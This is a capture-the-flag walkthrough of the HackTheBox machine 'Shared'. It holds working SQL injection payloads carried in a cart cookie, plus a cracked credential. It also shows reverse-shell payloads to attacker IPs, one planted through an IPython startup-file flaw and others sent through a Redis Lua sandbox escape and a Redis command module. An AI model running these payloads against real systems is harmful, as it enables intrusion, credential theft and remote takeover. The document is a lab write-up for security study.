---
title: "HTB - Shared"
categories: [box]
date: 2022-11-01
comments: true
image: /images/walkthroughs/hackthebox/shared/logo.png
favicon: /images/walkthroughs/hackthebox/shared/logo.png
description: HTB - Shared walkthrough
---

# Shared

<p align="center">
  <img src="/images/walkthroughs/hackthebox/shared/banner.png" width="90%"/>
</p>


## Summary

Shared is a medium difficulty box where we start on a prestashop with a custom checkout process. In that process, developers use the cookie as storage for customer cart. An SQL injection on the product id let us obtain and user and a password that we could crack on crackstation and reuse it on SSH to the machine.

Once inse we used ipython to do lateral movement from James to Dan user, since the second one is running that comand in a folder where James can create files.

Now, using Dan user, we can see a redis_connection_dev go executable with is owned by group sysadmin (Dan belongs to that group). Checking its behaviour, we can see that it sends credentials, so a local inspection with netcat will display the password send to the redis server. Using that password and a LUA sandbox escape vulnerability on redis server (CVE-2022-0543) we can read the flag. Alternatively, we cna compile a redis module and use it as a command execution to get a revshell as root. 


## Enumeration

We start with nmap:

- nmap

```bash
nmap -sC -sV -oA nmap -p- 10.10.11.172
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-01 03:54 EDT
Nmap scan report for 10.10.11.172
Host is up (0.041s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 91:e8:35:f4:69:5f:c2:e2:0e:27:46:e2:a6:b6:d8:65 (RSA)
|   256 cf:fc:c4:5d:84:fb:58:0b:be:2d:ad:35:40:9d:c3:51 (ECDSA)
|_  256 a3:38:6d:75:09:64:ed:70:cf:17:49:9a:dc:12:6d:11 (ED25519)
80/tcp  open  http     nginx 1.18.0
|_http-title: Did not follow redirect to http://shared.htb
|_http-server-header: nginx/1.18.0
443/tcp open  ssl/http nginx 1.18.0
|_http-title: Did not follow redirect to https://shared.htb
| tls-nextprotoneg: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=*.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US
| Not valid before: 2022-03-20T13:37:14
|_Not valid after:  2042-03-15T13:37:14
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.18.0
| tls-alpn: 
|   h2
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

We can see the hostname leaked at the certificate. I added shared.htb to /etc/hosts

- Gobuster

```bash
gobuster dir -u "https://shared.htb" --wordlist=/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt -t 20 -k --exclude-length 0
===============================================================
2022/08/01 03:56:41 Starting gobuster in directory enumeration mode
===============================================================
/cache                (Status: 301) [Size: 169] [--> https://shared.htb/cache/]
/modules              (Status: 301) [Size: 169] [--> https://shared.htb/modules/]
/js                   (Status: 301) [Size: 169] [--> https://shared.htb/js/]     
/bin                  (Status: 301) [Size: 169] [--> https://shared.htb/bin/]    
/themes               (Status: 301) [Size: 169] [--> https://shared.htb/themes/] 
/download             (Status: 301) [Size: 169] [--> https://shared.htb/download/]
/img                  (Status: 301) [Size: 169] [--> https://shared.htb/img/]     
/docs                 (Status: 301) [Size: 169] [--> https://shared.htb/docs/]    
/config               (Status: 301) [Size: 169] [--> https://shared.htb/config/]  
/upload               (Status: 301) [Size: 169] [--> https://shared.htb/upload/]  
/api                  (Status: 401) [Size: 16]                                    
/app                  (Status: 301) [Size: 169] [--> https://shared.htb/app/]     
/tools                (Status: 301) [Size: 169] [--> https://shared.htb/tools/]   
/pdf                  (Status: 301) [Size: 169] [--> https://shared.htb/pdf/]     
/classes              (Status: 301) [Size: 169] [--> https://shared.htb/classes/] 
/var                  (Status: 301) [Size: 169] [--> https://shared.htb/var/]     
/mails                (Status: 301) [Size: 169] [--> https://shared.htb/mails/]   
/translations         (Status: 301) [Size: 169] [--> https://shared.htb/translations/]
/src                  (Status: 301) [Size: 169] [--> https://shared.htb/src/]         
/controllers          (Status: 301) [Size: 169] [--> https://shared.htb/controllers/] 
/vendor               (Status: 301) [Size: 169] [--> https://shared.htb/vendor/]      
/webservice           (Status: 301) [Size: 169] [--> https://shared.htb/webservice/]  
/Makefile             (Status: 200) [Size: 88]                                        
/api-doc              (Status: 401) [Size: 16]                                        
/apis                 (Status: 401) [Size: 16]                                        
/localization         (Status: 301) [Size: 169] [--> https://shared.htb/localization/]
/api_test             (Status: 401) [Size: 16]                                        
/api3                 (Status: 401) [Size: 16]                                        
/api2                 (Status: 401) [Size: 16]                                        
/api4                 (Status: 401) [Size: 16]
```

Checking the website it says that they have implemented a new checkout function. 

<p align="center">
  <img src="/images/walkthroughs/hackthebox/shared/1_0_web.png" width="90%"/>
</p>

On the results from gobuster we can see an [API](https://shared.htb/api_test) with basic auth:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/shared/1_1_basic_auth.png" width="90%"/>
</p>


Intesting code in the website:

```js
  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "WebSite",
      "url" : "https://shared.htb/index.php",
              "image": {
          "@type": "ImageObject",
          "url":"https://shared.htb/img/logo.png"
        },
            "potentialAction": {
        "@type": "SearchAction",
        "target": "https://shared.htb/index.php?controller=search&amp;search_query={search_term_string}",
        "query-input": "required name=search_term_string"
      }
    }
  </script>
```

Interesting file found on gobuster. Well, not to much interesting, but keep in mind the build.sh
[MakeFile](https://shared.htb/Makefile)

```yaml
install: composer assets

composer:
	composer install

assets:
	./tools/assets/build.sh

```

With gobuster we found another interesting URL:
https://shared.htb/INSTALL.txt

With information about the version:

```
=== Prerequirements

To install PrestaShop 1.7, you need a web server running PHP 7.1.3+ and any flavor of MySQL 5.5+ (MySQL, MariaDB, Percona Server, etc.).
```

This version has multiple vulnerabilities. These are two of the most promising:


- CVE-2020-4074: In PrestaShop from version 1.5.0.0 and before version 1.7.6.6, the authentication system is malformed and an attacker is able to forge requests and execute admin commands. The problem is fixed in 1.7.6.6.

- CVE-2021-43789: PrestaShop is an Open Source e-commerce web application. Versions of PrestaShop prior to 1.7.8.2 are vulnerable to blind SQL injection using search filters with `orderBy` and `sortOrder` parameters. The problem is fixed in version 1.7.8.2.


Since it makes special focus on the new checkout, I want to test it first, then check the rest of findings. I added a shirt to the cart and when to the checkout then, the host header on the requests showed **checkout.shared.htb**. So add it to the /etc/hosts.
When we input the card and pay no requests are shown, only a bare alert with no more information. Also, when we load the web without info, no product is shown.

<p align="center">
  <img src="/images/walkthroughs/hackthebox/shared/1_3_payment.png" width="90%"/>
</p>

<p align="center">
  <img src="/images/walkthroughs/hackthebox/shared/1_4_pay_no_money.png" width="90%"/>
</p>


Inspecting the complete process, we see that the cookies are storing the customer cart, specifically on the "custom_cart". They are URL encoded:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/shared/1_2_checkout.png" width="90%"/>
</p>

```
custom_cart=%7B%2253GG2EF8%22%3A%221%22%7D
```

URL decode:

```json
custom_cart={"53GG2EF8":"1"}
```

That _53GG2EF8_ should be the ID for the item, so we will focus on there. Maybe it is making database queries to retrieve its information. Going some manual testing here, starting for the UNION kind. (It's the machine logo a hint for UNION SQL injection?)

```sql
'-1' UNION SELECT 1-- -
```
Result: not found

```sql
'-1' UNION SELECT 1,2-- -
```
Result: not found


```sql
'-1' UNION SELECT 1,2,3-- -
```
Result: 2

<p align="center">
  <img src="/images/walkthroughs/hackthebox/shared/2_0_sqli.png" width="90%"/>
</p>


So the table has 3 columns. With that information I tried to extract the table names:

```sql
'1' and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = database() -- -
```

custom_cart payload:
```json
{"1' and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema = database() and table_name ='user'-- -":"9899"}
```

Response:

```html
<th scope="row">1</th>
<td>user,product</td>
<td>9899</td>
<td>$3,00</td>
```

Extracting columns

```sql
'1' and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema = database() and table_name ='user'-- -
```

```json
{"1' and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema = database() and table_name ='user'-- -":"9899"}
```

Response:

```html
<th scope="row">1</th>
<td>id,username,password</td>
<td>9899</td>
<td>$3,00</td>
```


Extracting the table users (0x3a it's a semicolumn for pretty print):


```sql
'1' and 1=2 union select 1,group_concat(username,0x3a,password),3 from user-- -
```

```json
{"1' and 1=2 union select 1,group_concat(username,0x3a,password),3 from user-- -":"9899"}
```

Response:

```html
<th scope="row">1</th>
<td>james_mason:fc895d4eddc2fc12f995e18c865cf273</td>
<td>9899</td>
<td>$3,00</td>
```

So we have the following user with a MD5 hash:

**james_mason:fc895d4eddc2fc12f995e18c865cf273**

In [crackstation](https://crackstation.net/) we obtain the password:

**james_mason:Soleil101**

First try was james and james_mason into SSH. The last one got me into the machine.

<p align="center">
  <img src="/images/walkthroughs/hackthebox/shared/4_0_in.png" width="90%"/>
</p>


## Lateral movement

We are user james_mason and flag can be found on dan_smith home directory.

```bash
james_mason@shared:~$ id
uid=1000(james_mason) gid=1000(james_mason) groups=1000(james_mason),1001(developer)
```

With pspy64 we could find some interesting activities by user 1001 (dan_smith):

```bash
2022/08/01 12:44:31 CMD: UID=0    PID=1      | /sbin/init 
2022/08/01 12:45:01 CMD: UID=0    PID=32476  | /usr/sbin/CRON -f 
2022/08/01 12:45:01 CMD: UID=0    PID=32475  | /usr/sbin/CRON -f 
2022/08/01 12:45:01 CMD: UID=0    PID=32477  | /bin/sh -c /root/c.sh 
2022/08/01 12:45:01 CMD: UID=0    PID=32478  | /bin/bash /root/c.sh 
2022/08/01 12:45:01 CMD: UID=0    PID=32479  | sleep 5 
2022/08/01 12:45:01 CMD: UID=1001 PID=32480  | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython 
2022/08/01 12:45:01 CMD: UID=1001 PID=32481  | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython 
2022/08/01 12:45:01 CMD: UID=1001 PID=32482  | /usr/bin/python3 /usr/local/bin/ipython 
2022/08/01 12:45:06 CMD: UID=0    PID=32487  | perl -ne s/\((\d+)\)/print " $1"/ge 
2022/08/01 12:45:06 CMD: UID=0    PID=32486  | /bin/bash /root/c.sh 
2022/08/01 12:45:06 CMD: UID=0    PID=32485  | /bin/bash /root/c.sh 
2022/08/01 12:45:06 CMD: UID=0    PID=32488  | pidof redis-server 
2022/08/01 12:45:06 CMD: UID=0    PID=32491  | 
2022/08/01 12:45:06 CMD: UID=0    PID=32492  | (s-server) 
```

The ipython sounds strange to me. I made a quick Google search and checked the version installed in the machine:

```bash
james_mason@shared:/home$ /usr/bin/python3 /usr/local/bin/ipython  --version
8.0.0
```

Looking for privesc on that ipython, we could see the following [cybersecurity-help.cz](https://www.cybersecurity-help.cz/vdb/SB2022020212) page called _Privilege escalation in IPython_ (big shoutout to CZ CERT, they have such valuable information) with CVE-2022-21699. In the [iPython GitHub](https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x) we can see the PoC:

From the PoC:

User1:
```
mkdir -m 777 /tmp/profile_default
mkdir -m 777 /tmp/profile_default/startup
echo 'print("stealing your private secrets")' > /tmp/profile_default/startup/foo.py
```

User2:
```
cd /tmp
ipython
```

User2 will see:
```
Python 3.9.7 (default, Oct 25 2021, 01:04:21)
Type 'copyright', 'credits' or 'license' for more information
IPython 7.29.0 -- An enhanced Interactive Python. Type '?' for help.
stealing your private secrets
```

We have rights to create files in that /opt/scripts_review/ folder, therefore, let's create a revshell:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/shared/4_2_perm.png" width="90%"/>
</p>


```bash
mkdir -m 777 /opt/scripts_review/profile_default
mkdir -m 777 /opt/scripts_review/profile_default/startup
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.80",5454));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' > /opt/scripts_review/profile_default/startup/foo.py

```
And we got the revshell as **dan_smith**, we can get the flag:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/shared/5_0_user.png" width="90%"/>
</p>

``` 256adbed9f0b9323bd2e514b0dbecafc ```

## Priv esc

Looking in Dan's directory, we found a id_rsa key, so let's upgrade out shell to SSH.

```bash
ssh -i id_rsa dan_smith@10.10.11.172
```

On Dan's directory we have the ncat script and the redis information. We saw something about redis on the pspy64 executed with james:

```bash
dan_smith@shared:~$ ls -lka
total 2900
drwxr-xr-x 4 dan_smith dan_smith    4096 Aug  1 12:25 .
drwxr-xr-x 4 root      root         4096 Jul 14 13:46 ..
lrwxrwxrwx 1 root      root            9 Mar 20 09:42 .bash_history -> /dev/null
-rw-r--r-- 1 dan_smith dan_smith     220 Aug  4  2021 .bash_logout
-rw-r--r-- 1 dan_smith dan_smith    3526 Aug  4  2021 .bashrc
drwxr-xr-x 3 dan_smith dan_smith    4096 Jul 14 13:47 .ipython
-rwxr-xr-x 1 dan_smith dan_smith 2914424 Jul  8 17:34 ncat
-rw-r--r-- 1 dan_smith dan_smith     807 Aug  4  2021 .profile
-rw------- 1 dan_smith dan_smith   17868 Aug  1 12:49 .rediscli_history
drwx------ 2 dan_smith dan_smith    4096 Jul 14 13:47 .ssh
-rw-r----- 1 root      dan_smith      33 Jul 31 17:18 user.txt
```

So redis is installed in the system:

```bash
dan_smith@shared:~$ redis-server
33801:C 01 Aug 2022 13:29:43.810 # oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo
33801:C 01 Aug 2022 13:29:43.970 # Redis version=6.0.15, bits=64, commit=00000000, modified=0, pid=33801, just started
33801:C 01 Aug 2022 13:29:43.970 # Warning: no config file specified, using the default config. In order to specify a config file use redis-server /path/to/redis.conf
33801:M 01 Aug 2022 13:29:43.971 * Increased maximum number of open files to 10032 (it was originally set to 1024).
33801:M 01 Aug 2022 13:29:43.972 # Could not create server TCP listening socket *:6379: bind: Address already in use
dan_smith@shared:~$ 
```

With linpeas.sh we could see that the redis_connector_dev executable file is owned by root and group sysadmin...

```bash
╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root dan_smith 33 Jul 31 17:18 /home/dan_smith/user.txt                                                                                                                   
-rwxr-x--- 1 root sysadmin 5974154 Mar 20 09:41 /usr/local/bin/redis_connector_dev
```

Since dan_smith is in the group sysadmin, we can execute the file:

```bash
dan_smith@shared:/tmp$ /usr/local/bin/redis_connector_dev
[+] Logging to redis instance using password...

INFO command result:
# Server
redis_version:6.0.15
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:4610f4c3acf7fb25
redis_mode:standalone
os:Linux 5.10.0-16-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:10.2.1
process_id:46618
run_id:809208b90681a2c7bc11c4d581c1c116294e2d08
tcp_port:6379
uptime_in_seconds:4
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:15210183
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
io_threads_active:0
 <nil>

file redis_connector_dev 
  redis_connector_dev: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, Go BuildID=sdGIDsCGb51jonJ_67fq/_JkvEmzwH9g6f0vQYeDG/iH1iXHhyzaDZJ056wX9s/7UVi3T2i2LVCU8nXlHgr, not stripped
```

The file it's a go executable. We can see that it send the credentials to the server. One option is to sniff the network on the host, but since the server is installed in that machine, we cannot get any netcat working to catch that traffic. Therefore, I copy the file to my local machine and executed the file with netcat. I tried with tcpdump but since the client did not found open ports on the local machine, therefore no connection is stablised. So I used netcat to see any transaction with the server and succeed.

```bash
kali@kali:~/Desktop/HackTheBox/Shared$ scp -i id_rsa dan_smith@10.10.11.172:/usr/local/bin/redis_connector_dev .


kali@kali:~/Desktop/HackTheBox/Shared$ nc -lvnp 6379
listening on [any] 6379 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 42938
*2
$4
auth
$16
F2WHqJUz2WEz=Gqq

kali@kali:~/Desktop/HackTheBox/Shared$ ./redis_connector_dev

```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/shared/6_1_pass.png" width="90%"/>
</p>


Then we can use the password (we have no user) to get a cli. Once in the CLI I searched for LUA sandbox escape options, finding CVE-2022-0543. I followed [this post](https://thesecmaster.com/how-to-fix-cve-2022-0543-a-critical-lua-sandbox-escape-vulnerability-in-redis/) and could read the flag: 

```bash
eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("cat /root/root.txt", "r"); local res = f:read("*a"); f:close(); return res' 0

Tried the reverse but didnt worked

eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("bash -i &> /dev/tcp/10.10.14.112/5454 0>&1","r"); local res = f:read("*a"); f:close(); return res' 0
```

And we get the root flag:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/shared/7_0_root.png" width="90%"/>
</p>

We can also get a revshell. Trying to insert it into the io.popen function didn't work out, so I tried other method published on HackTricks, using [this GitHub repo](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand). Essetially it is a module that you can load on redis and it will execute commands. Just make the module and upload it to the box. Run redis-cli, use the password, load the module and execute your revshell:

```bash
dan_smith@shared:~$ redis-cli
127.0.0.1:6379> AUTH F2WHqJUz2WEz=Gqq
OK
127.0.0.1:6379> MODULE LOAD /home/dan_smith/module.so
OK
127.0.0.1:6379> system.exec "bash -c 'bash -i &> /dev/tcp/10.10.14.112/5454 0>&1'"
``

<p align="center">
  <img src="/images/walkthroughs/hackthebox/shared/7_2_rev.png" width="90%"/>
</p>

